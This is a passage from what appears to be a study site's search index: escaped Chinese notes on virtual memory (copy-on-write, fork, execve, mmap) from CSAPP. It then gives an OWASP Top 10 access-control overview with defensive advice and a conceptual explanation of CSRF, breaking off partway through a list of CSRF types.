\u7b2c\u4e00\u6b21\u5f15\u7528\u8fd9\u6837\u4e00\u4e2a\u533a\u57df\u5185\u7684\u865a\u62df\u9875\u9762\u65f6\uff0c\u5185\u6838\u5c31\u5728\u7269\u7406\u5185\u5b58\u4e2d\u627e\u5230\u4e00\u4e2a\u5408\u9002\u7684\u727a\u7272\u9875\u9762\uff0c\u5982\u679c\u8be5\u9875\u9762\u88ab\u4fee\u6539\u8fc7\uff0c\u5c31\u5c06\u8fd9\u4e2a\u9875\u9762\u6362\u51fa\u6765\uff0c\u7528\u4e8c\u8fdb\u5236\u96f6\u8986\u76d6\u727a\u7272\u9875\u9762\u5e76\u66f4\u65b0\u9875\u8868\uff0c\u5c06\u8fd9\u4e2a\u9875\u9762\u6807\u8bb0\u4e3a\u662f\u9a7b\u7559\u5728\u5185\u5b58\u4e2d\u7684\u3002\u6ce8\u610f\u5728\u78c1\u76d8\u548c\u5185\u5b58\u4e4b\u95f4\u5e76\u6ca1\u6709\u5b9e\u9645\u7684\u6570\u636e\u4f20\u9001\u3002\u56e0\u4e3a\u8fd9\u4e2a\u539f\u56e0\uff0c\u6620\u5c04\u5230\u533f\u540d\u6587\u4ef6\u7684\u533a\u57df\u4e2d\u7684\u9875\u9762\u6709\u65f6\u4e5f\u53eb\u505a\u8bf7    \u6c42\u4e8c\u8fdb\u5236\u96f6\u7684\u9875\uff08demand-zero page\uff09\u3002</li> </ol> <p>\u65e0\u8bba\u5728\u54ea\u79cd\u60c5\u51b5\u4e2d\uff0c\u4e00\u65e6\u4e00\u4e2a\u865a\u62df\u9875\u9762\u88ab\u521d\u59cb\u5316\u4e86\uff0c\u5b83\u5c31\u5728\u4e00\u4e2a\u7531\u5185\u6838\u7ef4\u62a4\u7684\u4e13\u95e8\u7684 \u4ea4\u6362\u6587\u4ef6\uff08swap file\uff09\u4e4b\u95f4\u6362\u6765\u6362\u53bb\u3002\u4ea4\u6362\u6587\u4ef6\u4e5f\u53eb\u505a \u4ea4\u6362\u7a7a\u95f4\uff08swap space\uff09\u6216\u8005 \u4ea4\u6362\u533a\u57df\uff08swap area\uff09\u3002\u9700\u8981\u610f\u8bc6\u5230\u7684\u5f88\u91cd\u8981\u7684\u4e00\u70b9\u662f\uff0c\u5728\u4efb\u4f55\u65f6\u523b\uff0c\u4ea4\u6362\u7a7a\u95f4\u90fd\u9650\u5236\u7740\u5f53\u524d\u8fd0\u884c\u7740\u7684\u8fdb\u7a0b\u80fd\u591f\u5206\u914d\u7684\u865a\u62df\u9875\u9762\u7684\u603b\u6570\u3002</p> <p>\u4ea4\u6362\u7a7a\u95f4\u5c31\u662f\u865a\u62df\u5185\u5b58\u5b58\u50a8\u7684\u5730\u65b9\uff0c\u901a\u5e38\u5c31\u662f\u5728\u78c1\u76d8\u4e0a\u7684\u4e00\u4e2a\u6587\u4ef6\uff01</p> <p>\u518d\u770b\u5171\u4eab\u5bf9\u8c61</p> <p>\u8fdb\u7a0b\u8fd9\u4e00\u62bd\u8c61\u80fd\u591f\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u63d0\u4f9b\u81ea\u5df1\u79c1\u6709\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff0c\u53ef\u4ee5\u514d\u53d7\u5176\u4ed6\u8fdb\u7a0b\u7684\u9519\u8bef\u8bfb\u5199\u3002\u4e0d\u8fc7\uff0c\u8bb8\u591a\u8fdb\u7a0b\u6709\u76f8\u540c\u7684\u53ea\u8bfb\u4ee3\u7801\u533a\u57df\uff0c\u4f8b\u5982\uff0c\u6bcf\u4e2a C \u7a0b\u5e8f\u90fd\u9700\u8981\u6765\u81ea\u6807\u51c6 C \u5e93\u7684\u8bf8\u5982 printf \u8fd9\u6837\u7684\u51fd\u6570\u3002</p> <p>\u5185\u5b58\u6620\u5c04\u7ed9\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u79cd\u6e05\u6670\u7684\u673a\u5236\uff0c\u7528\u6765\u63a7\u5236\u591a\u4e2a\u8fdb\u7a0b\u5982\u4f55\u5171\u4eab\u5bf9\u8c61\u3002</p> <p>\u4e00\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u88ab\u6620\u5c04\u5230\u865a\u62df\u5185\u5b58\u7684\u4e00\u4e2a\u533a\u57df\uff0c\u8981\u4e48\u4f5c\u4e3a\u5171\u4eab\u5bf9\u8c61\uff0c\u8981\u4e48\u4f5c\u4e3a\u79c1\u6709\u5bf9\u8c61\u3002</p> <ul> <li>\u5982\u679c\u4e00\u4e2a\u8fdb\u7a0b\u5c06\u4e00\u4e2a\u5171\u4eab\u5bf9\u8c61\u6620\u5c04\u5230\u5b83\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u4e00\u4e2a\u533a\u57df\u5185\uff0c\u90a3\u4e48\u8fd9\u4e2a\u8fdb\u7a0b\u5bf9\u8fd9\u4e2a\u533a\u57df\u7684\u4efb\u4f55\u5199\u64cd\u4f5c\uff0c\u5bf9\u4e8e\u90a3\u4e9b\u4e5f\u628a\u8fd9\u4e2a\u5171\u4eab\u5bf9\u8c61\u6620\u5c04\u5230\u5b83\u4eec\u865a\u62df\u5185\u5b58\u7684\u5176\u4ed6\u8fdb\u7a0b\u800c\u8a00\uff0c\u4e5f\u662f\u53ef\u89c1\u7684\u3002\u800c\u4e14\uff0c\u8fd9\u4e9b\u53d8\u5316\u4e5f\u4f1a\u53cd\u6620\u5728\u78c1\u76d8\u4e0a\u7684\u539f\u59cb\u5bf9\u8c61\u4e2d\u3002</li> <li>\u53e6\u4e00\u65b9\u9762\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u6620\u5c04\u5230\u79c1\u6709\u5bf9\u8c61\u7684\u533a\u57df\u505a\u7684\u6539\u53d8\uff0c\u5bf9\u4e8e\u5176\u4ed6\u8fdb\u7a0b\u6765\u8bf4\u662f\u4e0d\u53ef\u89c1\u7684\uff0c\u5e76\u4e14\u8fdb\u7a0b\u5bf9\u8fd9\u4e2a\u533a\u57df\u6240\u505a\u7684\u4efb\u4f55\u5199\u64cd\u4f5c\u90fd\u4e0d\u4f1a\u53cd\u6620\u5728\u78c1\u76d8\u4e0a\u7684\u5bf9\u8c61\u4e2d\u3002</li> </ul> <p>\u4e00\u4e2a\u6620\u5c04\u5230\u5171\u4eab\u5bf9\u8c61\u7684\u865a\u62df\u5185\u5b58\u533a\u57df\u53eb\u505a \u5171\u4eab\u533a\u57df\u3002\u7c7b\u4f3c\u5730\uff0c\u4e5f\u6709 \u79c1\u6709\u533a\u57df\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff0c\u8fdb\u7a0b 1 \u5c06\u4e00\u4e2a\u5171\u4eab\u5bf9\u8c61\u6620\u5c04\u5230\u5b83\u7684\u865a\u62df\u5185\u5b58\u7684\u4e00\u4e2a\u533a\u57df\u4e2d\uff0c\u968f\u540e\u8fdb\u7a0b 2 \u5c06\u540c\u4e00\u4e2a\u5171\u4eab\u5bf9\u8c61\u6620\u5c04\u5230\u5b83\u7684\u5730\u5740\u7a7a\u95f4\uff08\u5e76\u4e0d\u4e00\u5b9a\u8981\u548c\u8fdb\u7a0b 1 \u5728\u76f8\u540c\u7684\u865a\u62df\u5730\u5740\u5904\u3002</p> <p>\u56e0\u4e3a\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u6709\u4e00\u4e2a\u552f\u4e00\u7684\u6587\u4ef6\u540d\uff0c\u5185\u6838\u53ef\u4ee5\u8fc5\u901f\u5730\u5224\u5b9a\u8fdb\u7a0b 1 \u5df2\u7ecf\u6620\u5c04\u4e86\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u800c\u4e14\u53ef\u4ee5\u4f7f\u8fdb\u7a0b 2 \u4e2d\u7684\u9875\u8868\u6761\u76ee\u6307\u5411\u76f8\u5e94\u7684\u7269\u7406\u9875\u9762\u3002</p> <p></p> <p>\u79c1\u6709\u5bf9\u8c61\u4f7f\u7528\u4e00\u79cd\u53eb\u505a \u5199\u65f6\u590d\u5236\uff08copy-on-write\uff09\u7684\u5de7\u5999\u6280\u672f\u88ab\u6620\u5c04\u5230\u865a\u62df\u5185\u5b58\u4e2d\u3002\u4e00\u4e2a\u79c1\u6709\u5bf9\u8c61\u5f00\u59cb\u751f\u547d\u5468\u671f\u7684\u65b9\u5f0f\u57fa\u672c\u4e0a\u4e0e\u5171\u4eab\u5bf9\u8c61\u7684\u4e00\u6837\uff0c\u5728\u7269\u7406\u5185\u5b58\u4e2d\u53ea\u4fdd\u5b58\u6709\u79c1\u6709\u5bf9\u8c61\u7684\u4e00\u4efd\u526f\u672c\u3002</p> <p>\u5bf9\u4e8e\u6bcf\u4e2a\u6620\u5c04\u79c1\u6709\u5bf9\u8c61\u7684\u8fdb\u7a0b\uff0c\u76f8\u5e94\u79c1\u6709\u533a\u57df\u7684\u9875\u8868\u6761\u76ee\u90fd\u88ab\u6807\u8bb0\u4e3a\u53ea\u8bfb\uff0c\u5e76\u4e14\u533a\u57df\u7ed3\u6784\u88ab\u6807\u8bb0\u4e3a\u79c1\u6709\u7684\u5199\u65f6\u590d\u5236\u3002\u53ea\u8981\u6ca1\u6709\u8fdb\u7a0b\u8bd5\u56fe\u5199\u5b83\u81ea\u5df1\u7684\u79c1\u6709\u533a\u57df\uff0c\u5b83\u4eec\u5c31\u53ef\u4ee5\u7ee7\u7eed\u5171\u4eab\u7269\u7406\u5185\u5b58\u4e2d\u5bf9\u8c61\u7684\u4e00\u4e2a\u5355\u72ec\u526f\u672c\u3002\u7136\u800c\uff0c\u53ea\u8981\u6709\u4e00\u4e2a\u8fdb\u7a0b\u8bd5\u56fe\u5199\u79c1\u6709\u533a\u57df\u5185\u7684\u67d0\u4e2a\u9875\u9762\uff0c\u90a3\u4e48\u8fd9\u4e2a\u5199\u64cd\u4f5c\u5c31\u4f1a\u89e6\u53d1\u4e00\u4e2a\u4fdd\u62a4\u6545\u969c\u3002</p> <p></p> <p>\u5f53\u6545\u969c\u5904\u7406\u7a0b\u5e8f\u6ce8\u610f\u5230\u4fdd\u62a4\u5f02\u5e38\u662f\u7531\u4e8e\u8fdb\u7a0b\u8bd5\u56fe\u5199\u79c1\u6709\u7684\u5199\u65f6\u590d\u5236\u533a\u57df\u4e2d\u7684\u4e00\u4e2a\u9875\u9762\u800c\u5f15\u8d77\u7684\uff0c\u5b83\u5c31\u4f1a\u5728\u7269\u7406\u5185\u5b58\u4e2d\u521b\u5efa\u8fd9\u4e2a\u9875\u9762\u7684\u4e00\u4e2a\u65b0\u526f\u672c\uff0c\u66f4\u65b0\u9875\u8868\u6761\u76ee\u6307\u5411\u8fd9\u4e2a\u65b0\u7684\u526f\u672c\uff0c\u7136\u540e\u6062\u590d\u8fd9\u4e2a\u9875\u9762\u7684\u53ef\u5199\u6743\u9650\uff0c\u5982\u56fe b \u6240\u793a\u3002\u5f53\u6545\u969c\u5904\u7406\u7a0b\u5e8f\u8fd4\u56de\u65f6\uff0cCPU \u91cd\u65b0\u6267\u884c\u8fd9\u4e2a\u5199\u64cd\u4f5c\uff0c\u73b0\u5728\u5728\u65b0\u521b\u5efa\u7684\u9875\u9762\u4e0a\u8fd9\u4e2a\u5199\u64cd\u4f5c\u5c31\u53ef\u4ee5\u6b63\u5e38\u6267\u884c\u4e86\u3002</p> <p>\u901a\u8fc7\u5ef6\u8fdf\u79c1\u6709\u5bf9\u8c61\u4e2d\u7684\u526f\u672c\u76f4\u5230\u6700\u540e\u53ef\u80fd\u7684\u65f6\u523b\uff0c\u5199\u65f6\u590d\u5236\u6700\u5145\u5206\u5730\u4f7f\u7528\u4e86\u7a00\u6709\u7684\u7269\u7406\u5185\u5b58\u3002</p> <p>\u518d\u770b fork \u51fd\u6570</p> <p>\u65e2\u7136\u6211\u4eec\u7406\u89e3\u4e86\u865a\u62df\u5185\u5b58\u548c\u5185\u5b58\u6620\u5c04\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u6e05\u6670\u5730\u77e5\u9053 fork \u51fd\u6570\u662f\u5982\u4f55\u521b\u5efa\u4e00\u4e2a\u5e26\u6709\u81ea\u5df1\u72ec\u7acb\u865a\u62df\u5730\u5740\u7a7a\u95f4\u7684\u65b0\u8fdb\u7a0b\u7684\u3002</p> <p>\u5f53 fork \u51fd\u6570\u88ab\u5f53\u524d\u8fdb\u7a0b\u8c03\u7528\u65f6\uff0c\u5185\u6838\u4e3a\u65b0\u8fdb\u7a0b\u521b\u5efa\u5404\u79cd\u6570\u636e\u7ed3\u6784\uff0c\u5e76\u5206\u914d\u7ed9\u5b83\u4e00\u4e2a\u552f\u4e00\u7684 PID\u3002\u4e3a\u4e86\u7ed9\u8fd9\u4e2a\u65b0\u8fdb\u7a0b\u521b\u5efa\u865a\u62df\u5185\u5b58\uff0c\u5b83\u521b\u5efa\u4e86\u5f53\u524d\u8fdb\u7a0b\u7684 mm_struct\u3001\u533a\u57df\u7ed3\u6784\u548c\u9875\u8868\u7684\u539f\u6837\u526f\u672c\u3002\u5b83\u5c06\u4e24\u4e2a\u8fdb\u7a0b\u4e2d\u7684\u6bcf\u4e2a\u9875\u9762\u90fd\u6807\u8bb0\u4e3a\u53ea\u8bfb\uff0c\u5e76\u5c06\u4e24\u4e2a\u8fdb\u7a0b\u4e2d\u7684\u6bcf\u4e2a\u533a\u57df\u7ed3\u6784\u90fd\u6807\u8bb0\u4e3a\u79c1\u6709\u7684\u5199\u65f6\u590d\u5236\u3002</p> <p>\u5f53 fork \u5728\u65b0\u8fdb\u7a0b\u4e2d\u8fd4\u56de\u65f6\uff0c\u65b0\u8fdb\u7a0b\u73b0\u5728\u7684\u865a\u62df\u5185\u5b58\u521a\u597d\u548c\u8c03\u7528 fork \u65f6\u5b58\u5728\u7684\u865a\u62df\u5185\u5b58\u76f8\u540c\u3002\u5f53\u8fd9\u4e24\u4e2a\u8fdb\u7a0b\u4e2d\u7684\u4efb\u4e00\u4e2a\u540e\u6765\u8fdb\u884c\u5199\u64cd\u4f5c\u65f6\uff0c\u5199\u65f6\u590d\u5236\u673a\u5236\u5c31\u4f1a\u521b\u5efa\u65b0\u9875\u9762\uff0c\u56e0\u6b64\uff0c\u4e5f\u5c31\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u4fdd\u6301\u4e86\u79c1\u6709\u5730\u5740\u7a7a\u95f4\u7684\u62bd\u8c61\u6982\u5ff5\u3002</p> <p>\u518d\u770b execve \u51fd\u6570</p> <p>\u865a\u62df\u5185\u5b58\u548c\u5185\u5b58\u6620\u5c04\u5728\u5c06\u7a0b\u5e8f\u52a0\u8f7d\u5230\u5185\u5b58\u7684\u8fc7\u7a0b\u4e2d\u4e5f\u626e\u6f14\u7740\u5173\u952e\u7684\u89d2\u8272\u3002\u65e2\u7136\u5df2\u7ecf\u7406\u89e3\u4e86\u8fd9\u4e9b\u6982\u5ff5\uff0c\u6211\u4eec\u5c31\u80fd\u591f\u7406\u89e3 execve \u51fd\u6570\u5b9e\u9645\u4e0a\u662f\u5982\u4f55\u52a0\u8f7d\u548c\u6267\u884c\u7a0b\u5e8f\u7684\u3002\u5047\u8bbe\u8fd0\u884c\u5728\u5f53\u524d\u8fdb\u7a0b\u4e2d\u7684\u7a0b\u5e8f\u6267\u884c\u4e86\u5982\u4e0b\u7684 execve \u8c03\u7528\uff1a</p> <pre><code>execve(\"a.out\", NULL, NULL);\n</code></pre> <p>\u6b63\u5982\u4e4b\u524d\u5b66\u5230\u7684\uff0cexecve \u51fd\u6570\u5728\u5f53\u524d\u8fdb\u7a0b\u4e2d\u52a0\u8f7d\u5e76\u8fd0\u884c\u5305\u542b\u5728\u53ef\u6267\u884c\u76ee\u6807\u6587\u4ef6 a.out \u4e2d\u7684\u7a0b\u5e8f\uff0c\u7528 a.out \u7a0b\u5e8f\u6709\u6548\u5730\u66ff\u4ee3\u4e86\u5f53\u524d\u7a0b\u5e8f\u3002\u52a0\u8f7d\u5e76\u8fd0\u884c a.out \u9700\u8981\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4\uff1a</p> <ol> <li>\u5220\u9664\u5df2\u5b58\u5728\u7684\u7528\u6237\u533a\u57df\u3002 \u5220\u9664\u5f53\u524d\u8fdb\u7a0b\u865a\u62df\u5730\u5740\u7684\u7528\u6237\u90e8\u5206\u4e2d\u7684\u5df2\u5b58\u5728\u7684\u533a\u57df\u7ed3\u6784\u3002</li> <li>\u6620\u5c04\u79c1\u6709\u533a\u57df\u3002 \u4e3a\u65b0\u7a0b\u5e8f\u7684\u4ee3\u7801\u3001\u6570\u636e\u3001bss \u548c\u6808\u533a\u57df\u521b\u5efa\u65b0\u7684\u533a\u57df\u7ed3\u6784\u3002\u6240\u6709\u8fd9\u4e9b\u65b0\u7684\u533a\u57df\u90fd\u662f\u79c1\u6709\u7684\u3001\u5199\u65f6\u590d\u5236\u7684\u3002\u4ee3\u7801\u548c\u6570\u636e\u533a\u57df\u88ab\u6620\u5c04\u4e3a    a.out \u6587\u4ef6\u4e2d\u7684. text \u548c. data \u533a\u3002bss \u533a\u57df\u662f\u8bf7\u6c42\u4e8c\u8fdb\u5236\u96f6\u7684\uff0c\u6620\u5c04\u5230\u533f\u540d\u6587\u4ef6\uff0c\u5176\u5927\u5c0f\u5305\u542b\u5728 a.out \u4e2d\u3002\u6808\u548c\u5806\u533a\u57df\u4e5f\u662f\u8bf7\u6c42\u4e8c\u8fdb\u5236\u96f6\u7684\uff0c\u521d\u59cb\u957f\u5ea6\u4e3a\u96f6\u3002\u56fe    9-31 \u6982\u62ec\u4e86\u79c1\u6709\u533a\u57df\u7684\u4e0d\u540c\u6620\u5c04\u3002</li> <li>\u6620\u5c04\u5171\u4eab\u533a\u57df\u3002 \u5982\u679c a.out \u7a0b\u5e8f\u4e0e\u5171\u4eab\u5bf9\u8c61\uff08\u6216\u76ee\u6807\uff09\u94fe\u63a5\uff0c\u6bd4\u5982\u6807\u51c6 C \u5e93    libc.so\uff0c\u90a3\u4e48\u8fd9\u4e9b\u5bf9\u8c61\u90fd\u662f\u52a8\u6001\u94fe\u63a5\u5230\u8fd9\u4e2a\u7a0b\u5e8f\u7684\uff0c\u7136\u540e\u518d\u6620\u5c04\u5230\u7528\u6237\u865a\u62df\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u5171\u4eab\u533a\u57df\u5185\u3002</li> <li>\u8bbe\u7f6e\u7a0b\u5e8f\u8ba1\u6570\u5668\uff08PC\uff09\u3002 execve \u505a\u7684\u6700\u540e\u4e00\u4ef6\u4e8b\u60c5\u5c31\u662f\u8bbe\u7f6e\u5f53\u524d\u8fdb\u7a0b\u4e0a\u4e0b\u6587\u4e2d\u7684\u7a0b\u5e8f\u8ba1\u6570\u5668\uff0c\u4f7f\u4e4b\u6307\u5411\u4ee3\u7801\u533a\u57df\u7684\u5165\u53e3\u70b9\u3002</li> </ol> <p></p> <p>\u4e0b\u4e00\u6b21\u8c03\u5ea6\u8fd9\u4e2a\u8fdb\u7a0b\u65f6\uff0c\u5b83\u5c06\u4ece\u8fd9\u4e2a\u5165\u53e3\u70b9\u5f00\u59cb\u6267\u884c\u3002Linux \u5c06\u6839\u636e\u9700\u8981\u6362\u5165\u4ee3\u7801\u548c\u6570\u636e\u9875\u9762\u3002</p> <p>\u4f7f\u7528 mmap \u51fd\u6570\u7684\u7528\u6237\u7ea7\u5185\u5b58\u6620\u5c04</p> <p>mmap \u51fd\u6570\u8981\u6c42\u5185\u6838\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u865a\u62df\u5185\u5b58\u533a\u57df\uff0c\u6700\u597d\u662f\u4ece\u5730\u5740 start \u5f00\u59cb\u7684\u4e00\u4e2a\u533a\u57df\uff0c\u5e76\u5c06\u6587\u4ef6\u63cf\u8ff0\u7b26 fd \u6307\u5b9a\u7684\u5bf9\u8c61\u7684\u4e00\u4e2a\u8fde\u7eed\u7684\u7247\uff08chunk\uff09\u6620\u5c04\u5230\u8fd9\u4e2a\u65b0\u7684\u533a\u57df\u3002</p> <p></p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_26","title":"\u4e03\u3001\u52a8\u6001\u5185\u5b58\u5206\u914d","text":"<p>\u5c31\u662f\u5806\u7684\u5206\u914d\uff0c\u53c2\u8003 CSAPP P589</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_27","title":"\u516b\u3001\u5783\u573e\u56de\u6536","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#io","title":"IO","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_28","title":"\u5e76\u53d1","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#c","title":"C \u7a0b\u5e8f\u4e2d\u5e38\u89c1\u7684\u4e0e\u5185\u5b58\u6709\u5173\u7684\u9519\u8bef","text":"<p>csapp P609</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#aslr-pie","title":"ASLR \u4e0e PIE","text":"<p>csapp p198</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#cannary","title":"cannary","text":""},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#nx","title":"Nx","text":""},{"location":"security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/","title":"OWASP TOP 10 2021","text":"<p>https://owasp.org/www-project-top-ten/</p> <p>\u4e2d\u6587\u7248\u53c2\u8003\uff1ahttps://blog.csdn.net/weixin_49422491/article/details/126078613</p>"},{"location":"security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/#a01-broken-access-control-csrf","title":"A01 Broken Access Control\uff08\u8d8a\u6743\u63a7\u5236\u6f0f\u6d1e\uff09\u5305\u542b CSRF","text":"<p>\u5e38\u89c1\u7684 CWE \u5305\u62ec\uff1a\u5c06\u654f\u611f\u4fe1\u606f\u6cc4\u9732\u7ed9\u672a\u7ecf\u6388\u6743\u7684\u53c2\u4e0e\u8005\u3001\u901a\u8fc7\u53d1\u9001\u7684\u6570\u636e\u6cc4\u9732\u654f\u611f\u4fe1\u606f\u3001\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff08csrf\uff09</p> <p>\u672a\u5bf9\u901a\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u5b9e\u65bd\u6070\u5f53\u7684\u8bbf\u95ee\u63a7\u5236\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b\u7f3a\u9677\u8bbf\u95ee \u672a\u7ecf\u6388\u6743 \u7684\u529f\u80fd\u6216\u6570\u636e\uff0c\u8fdb\u800c \u8d8a\u6743\uff0c\u4f8b\u5982\uff1a\u8bbf\u95ee\u5176\u4ed6\u7528\u6237\u7684\u5e10\u6237\u3001\u67e5\u770b\u654f\u611f\u6587\u4ef6\u3001\u4fee\u6539\u5176\u4ed6\u7528\u6237\u7684\u6570\u636e\u3001\u66f4\u6539\u8bbf\u95ee\u6743\u9650\u7b49\u3002</p> <p>\u8be6\u60c5\u53c2\u8003\uff1ahttps://zhuanlan.zhihu.com/p/130919069</p> <p>\u5982\u4f55\u9632\u8303</p> <p>1\u3001\u524d\u540e\u7aef\u540c\u65f6\u5bf9\u7528\u6237\u8f93\u5165\u4fe1\u606f\u8fdb\u884c\u6821\u9a8c\uff0c\u53cc\u91cd\u9a8c\u8bc1\u673a\u5236</p> <p>2\u3001 \u6267\u884c\u5173\u952e\u64cd\u4f5c\u524d\u5fc5\u987b\u9a8c\u8bc1\u7528\u6237\u8eab\u4efd\uff0c\u9a8c\u8bc1\u7528\u6237\u662f\u5426\u5177\u5907\u64cd\u4f5c\u6570\u636e\u7684\u6743\u9650</p> <p>3\u3001\u7279\u522b\u654f\u611f\u64cd\u4f5c\u53ef\u4ee5\u8ba9\u7528\u6237\u518d\u6b21\u8f93\u5165\u5bc6\u7801\u6216\u5176\u4ed6\u7684\u9a8c\u8bc1\u4fe1\u606f\u3002</p> <p>4\u3001\u53ef\u4ee5\u4ece\u7528\u6237\u7684\u52a0\u5bc6\u8ba4\u8bc1 cookie \u4e2d\u83b7\u53d6\u5f53\u524d\u7528\u6237 id\uff0c\u9632\u6b62\u653b\u51fb\u8005\u5bf9\u5176\u4fee\u6539\u3002\u6216\u5728 session\u3001cookie \u4e2d\u52a0\u5165\u4e0d\u53ef\u9884\u6d4b\u3001\u4e0d\u53ef\u731c\u89e3\u7684 user \u4fe1\u606f\u3002</p> <p>5\u3001\u76f4\u63a5\u5bf9\u8c61\u5f15\u7528\u7684\u52a0\u5bc6\u8d44\u6e90 ID\uff0c\u9632\u6b62\u653b\u51fb\u8005\u679a\u4e3e ID\uff0c\u654f\u611f\u6570\u636e\u7279\u6b8a\u5316\u5904\u7406</p> <p>6\u3001\u6c38\u8fdc\u4e0d\u8981\u76f8\u4fe1\u6765\u81ea\u7528\u6237\u7684\u8f93\u5165\uff0c\u5bf9\u4e8e\u53ef\u63a7\u53c2\u6570\u8fdb\u884c\u4e25\u683c\u7684\u68c0\u67e5\u4e0e\u8fc7\u6ee4</p>"},{"location":"security/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/OWASP%20TOP%2010/#csrf","title":"\u91cd\u70b9\u4e00\uff1aCSRF\uff08\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff09","text":"<p>CSRF\uff08Cross-site request forgery\uff09\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff1a\u653b\u51fb\u8005\u8bf1\u5bfc\u53d7\u5bb3\u8005\u8fdb\u5165\u7b2c\u4e09\u65b9\u7f51\u7ad9\uff0c\u5728\u7b2c\u4e09\u65b9\u7f51\u7ad9\u4e2d\uff0c\u5411\u88ab\u653b\u51fb\u7f51\u7ad9\u53d1\u9001\u8de8\u7ad9\u8bf7\u6c42\u3002\u5229\u7528\u53d7\u5bb3\u8005\u5728\u88ab\u653b\u51fb\u7f51\u7ad9\u5df2\u7ecf\u83b7\u53d6\u7684\u6ce8\u518c\u51ed\u8bc1\uff08\u4f8b\u5982 Cookie\uff09\uff0c\u7ed5\u8fc7\u540e\u53f0\u7684\u7528\u6237\u9a8c\u8bc1\uff0c\u8fbe\u5230\u5192\u5145\u7528\u6237\u5bf9\u88ab\u653b\u51fb\u7684\u7f51\u7ad9\u6267\u884c\u67d0\u9879\u64cd\u4f5c\u7684\u76ee\u7684\u3002</p> <p>\u4e00\u4e2a\u5178\u578b\u7684 CSRF \u653b\u51fb\u6d41\u7a0b\uff1a</p> <ul> <li>\u7528\u6237\u767b\u5f55 a.com\uff0c\u5e76\u4fdd\u7559\u4e86\u767b\u5f55\u51ed\u8bc1(cookie)</li> <li>\u653b\u51fb\u8005\u5f15\u8bf1\u7528\u6237\u8bbf\u95ee b.com\uff0c\u5982\uff0c\u8bf1\u5bfc\u6027\u6587\u5b57\u6309\u94ae\u7b49</li> <li>b.com \u5411 a.com \u53d1\u9001\u4e86\u4e00\u4e2a\u8bf7\u6c42\uff1aa.com/act=xx\u3002\u6d4f\u89c8\u5668\u4f1a\u9ed8\u8ba4\u643a\u5e26 a.com \u7684 cookie</li> <li>a.com \u63a5\u6536\u5230\u8bf7\u6c42\u540e\uff0c\u5bf9\u8bf7\u6c42\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5e76\u786e\u8ba4\u662f\u53d7\u5bb3\u7528\u6237\u7684\u51ed\u8bc1\uff0c\u8bef\u4ee5\u4e3a\u662f\u7528\u6237\u81ea\u5df1\u53d1\u9001\u7684\u8bf7\u6c42</li> <li>a.com \u4ee5\u7528\u6237\u540d\u4e49\u6267\u884c\u4e86 act=xx</li> <li>\u653b\u51fb\u5b8c\u6210\uff0c\u653b\u51fb\u8005\u5728\u7528\u6237\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\uff0c\u5192\u5145\u7528\u6237\uff0c\u8ba9 a.com \u6267\u884c\u4e86\u81ea\u5df1\u5b9a\u4e49\u7684\u64cd\u4f5c</li> </ul> <p>CSRF \u4e3b\u8981\u5206\u4e3a\u4e09\u7c7b\uff1a</p> <ul> <li>GET \u7c7b\u578b\uff1aimg \u6807\u7b7e script\u3002</li> </ul> 